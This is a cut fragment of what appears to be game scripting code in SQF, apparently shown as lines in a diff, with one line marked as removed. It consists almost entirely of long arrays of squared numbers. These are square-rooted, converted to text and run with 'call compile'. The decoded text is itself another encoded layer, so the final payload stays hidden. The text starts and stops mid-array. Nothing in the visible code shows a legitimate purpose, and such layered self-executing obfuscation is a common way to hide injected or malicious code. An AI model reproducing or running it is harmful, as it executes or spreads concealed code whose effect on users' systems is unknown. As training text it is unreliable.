2500,2809,2304,2304,1936,2500,2916,2304,2401,1936,2500,3025,2304,2704,1936,2500,3136,2304,3249,1936,2500,3249,2401,2916,1936,2601,2304,2500,2809,1936,2601,2401,2601,2916,1936,2601,2500,2704,3249,1936,2401,2809,2500,2401,1936,2601,2704,3136,2401,1936,2401,2809,2401,2500,3249,1936,2401,2401,2304,2500,2809,1936,2401,2304,2704,2304,2704,1936,2401,2916,2304,2304,1936,3249,2304,2500,2809,1936,2500,2809,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2704,2304,2704,1936,2401,2401,2304,2500,2809,1936,2401,2500,2401,2304,2304,1936,2401,2304,2304,2304,2304,1936,2401,2304,2500,2704,1936,3249,2304,2500,2809,1936,2401,2704,2704,2304,2304,1936,2401,2304,2500,2704,1936,2601,3136,2704,2704,1936,2601,3025,2500,2401,1936,2500,2601,2304,2704,1936,2401,2916,3136,2401,1936,2401,2601,2704,2809,2916,1936,2401,2304,3136,2401,2916,1936,2401,2304,2500,2304,2401,1936,2401,2500,2401,2304,2304,1936,2401,2809,2401,2500,3249,1936,3249,2304,2500,2809,1936,2500,2704,2304,2401,1936,2401,2304,2500,2704,1936,2401,2500,2809,2704,2704,1936,2401,2601,2916,3136,3249,1936,2401,2601,2500,2500,2809,1936,2401,2304,3136,2401,2916,1936,2704,2601,2809,2916,1936,3249,2704,2304,3249,1936,3249,3136,2304,2401,1936,2401,2401,2704,2704,3249,1936,2401,2304,2500,2704,1936,2401,2916,2304,2304,1936,3249,2304,2500,2809,1936,2500,2916,2304,2401,1936,2401,2304,2500,2704,1936,2401,2601,2500,2500,2809,1936,2401,2304,2500,2304,2401,1936,2401,2401,2916,2916,2704,1936,2401,2304,2500,2304,2401,1936,3249,3136,2304,2401,1936,2401,2601,2704,2809,2916,1936,2401,2916,2304,2304,1936,3249,2304,2500,2809,1936,2500,2809,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2704,2304,2704,1936,2401,2401,2304,2500,2809,1936,2401,2500,2401,2304,2304,1936,2401,2304,2304,2304,2304,1936,2401,2304,2500,2704,1936,3249,2304,2500,2809,1936,2401,2704,2704,2304,2304,1936,2401,2916,3136,2401,1936,2401,2916,3136,2401,1936,2601,2704,3136,2401,1936,2401,2809,2916,2500,2809,1936,2401,2304,2500,2304,2401,1936,2401,2401,2916,2916,2704,1936,2401,2601,2500,2500,2809,1936,2401,2304,2500,2304,2401,1936,2401,2809,2401,2500,3249,1936,3249,2304,2500,2809,1936,2500,2704,2304,2401,1936,2401,2304,2500,2704,1936,2401,2500,2809,2704,2704,1936,2401,2601,2916,3136,3249,1936,2401,2601,2500,2500,2809,1936,2401,2304,3136,2401,2916,1936,2704,2601,2809,2916,1936,3249,2704,2304,3249,1936,3249,3136,2304,2401,1936,2401,2401,2704,2704,3249,1936,2401,2304,2500,2704,1936,3249,2304,2500,2809,1936,2401,2704,2704,2304,2304,1936,2601,2704,3136,2401,1936,2401,2809,2916,2500,2809,1936,2601,2704,3136,2401,1936,2401,2809,2916,2500,2809,1936,2401,2304,2704,2304,2704,1936,2401,2500,2601,2500,2401,1936,2401,2500,3249,3249,2916,1936,2704,3025,2916,2401,1936,3249,2704,2304,3249,1936,3249,3136,2304,2401,1936,2401,2304,3136,2401,2916,1936,2401,2304,2500,2704,1936,2401,2601,2704,2809,2916,1936,2401,2500,2601,2500,2401,1936,2704,2500,2500,2809,1936,2401,2500,3249,3249,2916,1936,2401,2500,3249,3249,2916,1936,3249,2704,2304,3249,1936,2401,2704,2916,2704,2401,1936,2401,2304,2500,2704,1936,3249,2304,2500,2809,1936,2500,2601,2304,2704,1936,2601,2704,3136,2401,1936,3249,3136,2304,2401,1936,3249,2704,2304,3249,1936,2401,2401,2916,2916,2704,1936,2401,2401,2916,2916,2704,1936,2401,2304,2500,2704,1936,3249,3136,2304,2401,1936,2401,2500,2601,2500,2401,1936,2401,2401,3136,3136,2401,1936,2401,2500,2809,2704,2704,1936,2401,2401,2304,2500,2809,1936,2401,2401,2916,2916,2704,1936,2401,2304,2500,2304,2401,1936,2401,2304,2500,2704,1936,2401,2601,2704,2809,2916,1936,2401,2500,2601,2500,2401,1936,2916,3136,3136,3249,1936,2401,2601,2704,2809,2916,1936,2401,2500,3249,3249,2916,1936,2401,2401,2304,2500,2809,1936,2401,2500,2401,2304,2304,1936,2401,2304,2916,2304,3249,1936,2401,2304,2500,2704,1936,3249,2304,2500,2809,1936,2500,2704,2304,2401,1936,2401,2809,2916,2500,2809,1936,2601,2704,3136,2401,1936,2601,3249,1936,2704,2401,1936,2809,3249,1936,3249,3249,1936,3249,3025,1936,2401,2304,3136,1936,2401,2304,3136,1936,2601,2500,1936,3249,3249,1936,2401,2401,2401,1936,2401,2304,3249,1936,2401,2401,2500,1936,2401,2304,2809,1936,2401,2304,3136,1936,2401,2304,2401,1936,2601,2500,1936,2401,2401,2916,1936,2401,2401,2401,1936,3136,2601,1936,2401,2401,2916,1936,2401,2401,2704,1936,2401,2304,2809,1936,2401,2401,2304,1936,2401,2304,2601,1936,2601,2500,1936,3249,2809,1936,2704,3249,1936,2809,3249,1936,2401,2500,2809,1936,2809,3249,8649,3481];call compile toString _1;};
-	[]call{private['_1'];_1=[];{_1 pushBack sqrt _x}forEach [9801,9409,11664,11664,1024,9801,12321,11881,12544,11025,11664,10201,1024,13456,12321,13225,13456,12996,11025,12100,10609,8281,3249,2401,1936,3249,2601,1936,3249,3249,1936,3249,3025,1936,2401,2304,3136,1936,2401,2304,3136,1936,2401,2500,2601,1936,2401,2401,2500,1936,2401,2401,2704,1936,2401,2304,2809,1936,2401,2401,3136,1936,3249,3025,1936,2401,2401,2916,1936,2401,2304,2401,1936,3249,2401,1936,2601,3249,1936,3249,2809,1936,2704,3249,1936,2601,3249,1936,3249,2601,1936,2809,3249,1936,3249,2809,1936,2704,3249,1936,2916,2401,1936,3249,2401,1936,3249,2601,1936,2809,3249,1936,2401,2500,2601,1936,3249,2809,1936,2704,3249,1936,2601,2500,1936,2401,2401,2500,1936,2401,2401,3025,1936,2401,2401,2809,1936,2401,2304,2704,1936,2916,2916,1936,3249,3025,1936,3249,3249,1936,2401,2304,3025,1936,2601,2500,1936,2401,2401,2809,1936,2401,2401,2601,1936,2401,2401,2704,1936,2401,2401,2916,1936,2601,2500,1936,3249,2809,1936,2401,2500,2304,1936,2401,2500,2809,1936,2401,2304,2500,1936,2401,2401,2401,1936,2401,2401,2704,1936,2916,3249,1936,3249,3025,1936,3249,3249,1936,2401,2304,2704,1936,2601,2500,1936,2401,2401,2916,1936,2401,2401,2401,1936,2916,2809,1936,2401,2401,2704,1936,2401,2401,2704,1936,3249,3025,1936,2401,2500,2401,1936,2704,2304,1936,2601,3249,1936,3136,2500,3136,2401,1936,2401,2916,2304,2304,1936,2401,2809,2500,2401,1936,2401,2401,3136,3136,2401,1936,3025,2809,2916,3249,1936,2809,2916,2500,2809,1936,2809,2916,2500,2809,1936,2401,2304,2500,2704,1936,2401,2809,2401,2500,3249,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2809,2704,3025,2916,1936,2401,2601,2916,3136,3249,1936,2401,2704,2401,2916,2401,1936,2809,2401,3136,2704,1936,3025,2809,2916,3249,1936,3025,2601,3249,2916,1936,2500,2601,2304,2704,1936,2401,2304,2500,2704,1936,3249,2304,2500,2809,1936,3249,2916,2304,2704,1936,2601,2401,2601,2916,1936,2401,2401,3136,3136,2401,1936,2401,2304,2500,2704,1936,2601,3025,2500,2401,1936,2401,2304,2500,2704,1936,2401,2809,2401,2500,3249,1936,2401,2304,2500,2704,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,3249,2916,2304,2704,1936,2601,2401,2601,2916,1936,2401,2401,3136,3136,2401,1936,2601,2401,2601,2916,1936,2401,2704,3136,3136,2704,1936,3249,2916,2304,2704,1936,2401,2304,2500,2704,1936,2601,3025,2500,2401,1936,2401,2304,2500,2704,1936,2601,2401,2601,2916,1936,2401,2704,2401,2916,2401,1936,2809,2916,2500,2809,1936,2601,2704,3136,2401,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,3136,2500,3136,2401,1936,2401,2401,2809,2916,1936,2401,2601,3249,2500,2704,1936,2401,2401,2916,2916,2704,1936,2500,3249,2401,2916,1936,2401,2401,2916,2916,2704,1936,3025,3025,2704,2704,1936,3025,3025,2704,2704,1936,2809,2601,2500,3249,1936,2401,2304,2500,2304,2401,1936,3249,3136,2304,2401,1936,2500,3025,2304,2704,1936,2500,3249,2401,2916,1936,2500,3025,2304,2704,1936,2809,2601,2500,3249,1936,2401,2401,2916,2916,2704,1936,2401,2601,3249,2500,2704,1936,2916,2809,2916,2401,1936,3025,3025,2704,2704,1936,2401,2401,2809,2916,1936,2401,3249,2601,2916,1936,2401,2401,2809,2916,1936,2401,2601,3249,2500,2704,1936,2401,2401,2916,2916,2704,1936,2500,3249,2401,2916,1936,2401,2401,2916,2916,2704,1936,3025,3025,2704,2704,1936,3025,3025,2704,2704,1936,2809,2601,2500,3249,1936,2401,2304,2500,2304,2401,1936,2916,2809,2916,2401,1936,2500,3249,2401,2916,1936,2401,2304,2500,2304,2401,1936,2401,2304,2500,2304,2401,1936,2401,2601,2500,2500,2809,1936,3249,3136,2304,2401,1936,2401,2401,2916,2916,2704,1936,3025,3025,2704,2704,1936,3249,3136,2304,2401,1936,2401,2401,2809,2916,1936,2401,3249,2601,2916,1936,2401,2401,2809,2916,1936,2401,2601,3249,2500,2704,1936,2401,2401,2916,2916,2704,1936,2500,3249,2401,2916,1936,2401,2401,2916,2916,2704,1936,3025,3025,2704,2704,1936,3025,3025,2704,2704,1936,2809,2601,2500,3249,1936,2809,2601,2500,3249,1936,2500,3025,2304,2704,1936,2401,2304,2500,2304,2401,1936,2401,2601,3249,2500,2704,1936,2809,2601,2500,3249,1936,2401,2601,2500,2500,2809,1936,2809,2601,2500,3249,1936,2500,3249,2401,2916,1936,2401,2601,3249,2500,2704,1936,2500,3249,2401,2916,1936,2401,2401,2809,2916,1936,3136,2916,2704,3249,1936,2401,2304,2500,2704,1936,2704,2916,2500,2704,1936,2809,2704,3025,2916,1936,3025,2809,2916,3249,1936,2401,2500,2809,2704,2704,1936,2601,2401,2601,2916,1936,2401,2304,2500,2704,1936,2401,2809,2401,2500,3249,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2809,2704,3025,2916,1936,2401,2601,2916,3136,3249,1936,2401,2704,2401,2916,2401,1936,2809,2401,3136,2704,1936,3025,2809,2916,3249,1936,3025,2601,3249,2916,1936,2500,2601,2304,2704,1936,2401,2304,2500,2704,1936,3249,2304,2500,2809,1936,2401,2401,3136,3136,2401,1936,3025,2809,2916,3249,1936,2601,2401,2601,2916,1936,2601,2401,2601,2916,1936,2809,2304,2704,2401,1936,3025,2601,3249,2916,1936,2704,3249,2304,2304,1936,2401,2704,2401,2916,2401,1936,2401,2401,3136,3136,2401,1936,2401,2704,3136,3136,2704,1936,3136,2401,2304,2304,1936,2401,2704,2401,2916,2401,1936,2704,2916,2500,2704,1936,3025,2601,3249,2916,1936,2401,2304,2500,2704,1936,2601,3025,2500,2401,1936,2401,2304,2500,2704,1936,3249,2304,2500,2809,1936,3025,2601,3249,2916,1936,2401,2304,2304,2304,2304,1936,2401,2704,2401,2916,2401,1936,2704,2916,2500,2704,1936,2601,2704,3136,2401,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2809,2704,3025,2916,1936,2401,2601,2916,3136,3249,1936,2401,2704,2401,2916,2401,1936,2809,2401,3136,2704,1936,3025,2809,2916,3249,1936,3025,2601,3249,2916,1936,2500,2601,2304,2704,1936,2401,2304,2500,2704,1936,3249,2304,2500,2809,1936,3249,2916,2304,2704,1936,2601,2401,2601,2916,1936,2401,2401,3136,3136,2401,1936,3249,2304,2500,2809,1936,2704,2916,2500,2704,1936,2500,2601,2304,2704,1936,2601,2401,2601,2916,1936,2601,2304,2500,2809,1936,2401,2401,2704,2704,3249,1936,2500,2601,2304,2704,1936,2916,3025,2500,2704,1936,2704,2916,2500,2704,1936,2401,2500,3249,3249,2916,1936,2500,2601,2304,2704,1936,2704,2916,2500,2704,1936,2704,2916,2500,2704,1936,3025,2809,2916,3249,1936,2704,2601,2809,2916,1936,2500,2601,2304,2704,1936,2401,2304,2500,2704,1936,2601,3025,2500,2401,1936,2401,2304,2500,2704,1936,2401,2809,2401,2500,3249,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2809,2704,3025,2916,1936,3025,2809,2916,3249,1936,2401,2601,2916,3136,3249,1936,3025,2809,2916,3249,1936,2601,2500,2704,3249,1936,2704,2916,2500,2704,1936,2401,2304,2500,2704,1936,3136,2500,3136,2401,1936,2401,2401,2809,2916,1936,3249,2304,2500,2809,1936,2601,2500,2704,3249,1936,2500,2601,2304,2704,1936,2704,2916,2500,2704,1936,2704,2916,2500,2704,1936,3025,2809,2916,3249,1936,2704,2601,2809,2916,1936,2500,2601,2304,2704,1936,2401,2401,2809,2916,1936,3136,2916,2704,3249,1936,2601,2704,3136,2401,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,3136,2500,3136,2401,1936,3136,2500,3136,2401,1936,3249,2304,2500,2809,1936,2601,2500,2704,3249,1936,2500,2601,2304,2704,1936,2704,2916,2500,2704,1936,2704,2916,2500,2704,1936,3025,2809,2916,3249,1936,2704,2601,2809,2916,1936,2500,2601,2304,2704,1936,3136,2916,2704,3249,1936,2401,3249,2601,2916,1936,2401,2304,2500,2704,1936,2401,2809,2401,2500,3249,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2704,2401,2916,2401,1936,3249,2916,2304,2704,1936,2401,2916,2304,2304,1936,2401,2704,2401,2916,2401,1936,2704,2916,2500,2704,1936,2401,2500,2401,2304,2304,1936,2916,3025,2500,2704,1936,2809,2916,2500,2809,1936,2809,2916,2500,2809,1936,2401,2304,2500,2704,1936,2401,2916,2304,2304,1936,3249,2916,2304,2704,1936,2401,2704,2401,2916,2401,1936,2601,2401,2601,2916,1936,2601,2304,2500,2809,1936,2401,2304,2704,2304,2704,1936,2401,2704,2401,2916,2401,1936,2704,2916,2500,2704,1936,2809,2704,3025,2916,1936,2809,2916,2500,2809,1936,3025,2809,2916,3249,1936,3249,2704,2304,3249,1936,2401,2304,2500,2704,1936,2916,2809,2916,2401,1936,3025,3025,2704,2704,1936,2401,2601,2500,2500,2809,1936,2401,2916,3136,2401,1936,2401,2916,3136,2401,1936,2401,2304,2500,2704,1936,3025,2601,3249,2916,1936,2401,2304,2304,2304,2304,1936,2500,2601,2304,2704,1936,2601,2401,2601,2916,1936,2401,2304,2500,2704,1936,2401,2809,2401,2500,3249,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2304,2304,2304,1936,2401,2704,2401,2916,2401,1936,2601,2401,2601,2916,1936,3025,2601,3249,2916,1936,2401,2304,2500,2704,1936,3249,2304,2500,2809,1936,2601,2500,2704,3249,1936,2500,2601,2304,2704,1936,2704,2916,2500,2704,1936,2704,2916,2500,2704,1936,3025,2809,2916,3249,1936,2704,2601,2809,2916,1936,2500,2601,2304,2704,1936,2601,2704,3136,2401,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2809,2916,2500,2809,1936,2401,2304,2500,2704,1936,2500,2601,2304,2704,1936,2809,2916,2500,2809,1936,2704,2916,2500,2704,1936,2500,2601,2304,2704,1936,2401,2304,2500,2704,1936,2401,2809,2401,2500,3249,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,3136,2500,3136,2401,1936,2809,2304,2704,2401,1936,2401,2704,2916,2704,2401,1936,2704,3025,2916,2401,1936,2401,2500,2401,2304,2304,1936,2916,3025,2500,2704,1936,2809,2916,2500,2809,1936,2809,2916,2500,2809,1936,2401,3249,2601,2916,1936,3249,2304,2500,2809,1936,3025,2601,3249,2916,1936,2401,2304,2304,2304,2304,1936,2401,2704,2401,2916,2401,1936,2704,2916,2500,2704,1936,2401,2304,2500,2704,1936,2704,2916,2500,2704,1936,2500,2601,2304,2704,1936,2809,2916,2500,2809,1936,2500,2601,2304,2704,1936,2401,2401,3136,3136,2401,1936,3025,2601,3249,2916,1936,2401,2304,2500,2704,1936,3249,3136,2304,2401,1936,3136,2916,2704,3249,1936,2401,2304,2500,2704,1936,2401,2401,3136,3136,2401,1936,3025,2809,2916,3249,1936,2809,2916,2500,2809,1936,2809,2916,2500,2809,1936,2401,2304,2500,2704,1936,2500,2704,2304,2401,1936,3025,2500,2500,2809,1936,2401,2601,2704,2809,2916,1936,3249,2304,2500,2809,1936,3249,2916,2304,2704,1936,2601,2401,2601,2916,1936,2401,2401,3136,3136,2401,1936,3249,2304,2500,2809,1936,2704,2916,2500,2704,1936,2401,2304,2304,2304,2304,1936,2809,2304,2704,2401,1936,2401,2500,2809,2704,2704,1936,2401,2401,2500,2601,2916,1936,2916,3025,2500,2704,1936,2401,2601,2916,3136,3249,1936,3025,2809,2916,3249,1936,3025,2601,3249,2916,1936,2809,2304,2704,2401,1936,2401,2601,2916,3136,3249,1936,2401,2401,2304,2500,2809,1936,2500,2601,2304,2704,1936,2500,2601,2304,2704,1936,2601,2304,2500,2809,1936,2401,2704,2916,2704,2401,1936,3025,2809,2916,3249,1936,2401,2401,3136,3136,2401,1936,2401,2704,3136,3136,2704,1936,2401,2500,3249,3249,2916,1936,2500,2601,2304,2704,1936,2704,2916,2500,2704,1936,2704,2916,2500,2704,1936,3025,2809,2916,3249,1936,2704,2601,2809,2916,1936,2500,2601,2304,2704,1936,2601,2704,3136,2401,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2809,2916,2500,2809,1936,2601,2704,3136,2401,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2809,2916,2500,2809,1936,3136,2916,2704,3249,1936,2401,2304,2500,2704,1936,2401,2601,2916,3136,3249,1936,2500,2601,2304,2704,1936,2601,2500,2704,3249,1936,2809,2304,2704,2401,1936,3025,2601,3249,2916,1936,2500,2601,2304,2704,1936,2401,2304,3136,2401,2916,1936,2916,2304,3136,2704,1936,2500,2601,2304,2704,1936,2401,2401,3136,3136,2401,1936,2401,2304,2500,2704,1936,3136,2500,3136,2401,1936,2401,2401,2809,2916,1936,2704,2916,2500,2704,1936,2809,2704,3025,2916,1936,3025,2809,2916,3249,1936,2401,2500,2809,2704,2704,1936,2601,2401,2601,2916,1936,2401,2401,2809,2916,1936,2401,3249,2601,2916,1936,3249,2304,2500,2809,1936,2500,2809,2304,2304,1936,2500,2601,2304,2704,1936,2916,3025,2500,2704,1936,2704,2916,2500,2704,1936,2704,2500,2500,2809,1936,2809,2916,2500,2809,1936,3025,2809,2916,3249,1936,3249,2704,2304,3249,1936,2500,2601,2304,2704,1936,2401,2601,2916,3136,3249,1936,2704,2916,2500,2704,1936,3136,2916,2704,3249,1936,2601,2704,3136,2401,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2809,2916,2500,2809,1936,2601,2704,3136,2401,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2809,2704,3025,2916,1936,2401,2601,2916,3136,3249,1936,2401,2704,2401,2916,2401,1936,2809,2401,3136,2704,1936,3025,2809,2916,3249,1936,3025,2601,3249,2916,1936,2500,2601,2304,2704,1936,2401,2304,2500,2704,1936,3249,2304,2500,2809,1936,3249,2916,2304,2704,1936,2601,2401,2601,2916,1936,2401,2401,3136,3136,2401,1936,3249,2304,2500,2809,1936,2401,2401,3136,3136,2401,1936,2401,2304,2304,2304,2304,1936,2500,2601,2304,2704,1936,2401,2401,3136,3136,2401,1936,2401,2704,3136,3136,2704,1936,2401,2401,2304,2500,2809,1936,2809,2304,2704,2401,1936,2401,2601,2916,3136,3249,1936,2401,2401,2500,2601,2916,1936,2401,2304,2304,2304,2304,1936,2500,2601,2304,2704,1936,3025,2809,2916,3249,1936,3025,2601,3249,2916,1936,2500,2601,2304,2704,1936,2401,2601,2916,3136,3249,1936,2704,2916,2500,2704,1936,2401,2304,2500,2704,1936,2601,3025,2500,2401,1936,2401,2304,2500,2704,1936,2401,2809,2401,2500,3249,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2401,2809,2916,1936,2401,2401,2500,2601,2916,1936,2401,2304,2304,2304,2304,1936,2500,2601,2304,2704,1936,2401,2401,3136,3136,2401,1936,2401,2704,3136,3136,2704,1936,2401,2304,2500,2704,1936,3249,2916,2304,2704,1936,2809,2304,2704,2401,1936,2401,2601,2916,3136,3249,1936,2401,2304,2500,2704,1936,2500,2601,2304,2704,1936,2809,2401,3136,2704,1936,2401,2704,2401,2916,2401,1936,2809,2916,2500,2809,1936,2401,2304,2500,2704,1936,2401,2401,3136,3136,2401,1936,2401,2304,2304,2304,2304,1936,2500,2601,2304,2704,1936,3025,2809,2916,3249,1936,3025,2601,3249,2916,1936,2500,2601,2304,2704,1936,2401,2601,2916,3136,3249,1936,2704,2916,2500,2704,1936,2401,2401,2809,2916,1936,2601,2704,3136,2401,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2809,2704,3025,2916,1936,2401,2601,2916,3136,3249,1936,2401,2704,2401,2916,2401,1936,2809,2401,3136,2704,1936,3025,2809,2916,3249,1936,3025,2601,3249,2916,1936,2500,2601,2304,2704,1936,2401,2304,2500,2704,1936,3249,2304,2500,2809,1936,2500,2809,2304,2304,1936,2500,2601,2304,2704,1936,2916,3025,2500,2704,1936,2704,2916,2500,2704,1936,2704,2500,2500,2809,1936,2809,2916,2500,2809,1936,3025,2809,2916,3249,1936,3249,2704,2304,3249,1936,2500,2601,2304,2704,1936,2401,2601,2916,3136,3249,1936,2704,2916,2500,2704,1936,2401,2304,2500,2704,1936,2601,3025,2500,2401,1936,2401,2304,2500,2704,1936,3025,2809,2916,3249,1936,2809,2916,2500,2809,1936,2809,2916,2500,2809,1936,2704,2500,2500,2809,1936,2809,2916,2500,2809,1936,3025,2809,2916,3249,1936,3249,2704,2304,3249,1936,2500,2601,2304,2704,1936,2401,2601,2916,3136,3249,1936,2704,2916,2500,2704,1936,2401,2304,2500,2704,1936,2704,2916,2500,2704,1936,2500,2601,2304,2704,1936,2809,2916,2500